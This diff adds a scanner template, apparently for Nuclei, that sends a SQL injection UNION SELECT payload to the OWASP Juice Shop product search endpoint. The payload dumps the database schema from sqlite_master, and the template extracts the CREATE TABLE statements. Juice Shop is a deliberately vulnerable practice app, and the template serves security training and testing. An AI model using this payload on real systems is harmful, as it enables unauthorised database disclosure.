@@ -1,0 +1,25 @@
+id: juice-shop-database-schema
+
+info:
+  name: Database Schema
+  author: yelaco
+  severity: critical
+  tags: juice-shop,sqli
+  description: Exfiltrate the entire DB schema definition via SQL Injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/products/search?q=qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--"
+
+    matchers:
+      - type: word
+        words:
+          - "CREATE TABLE"
+        part: body
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "CREATE TABLE.*?\\)"
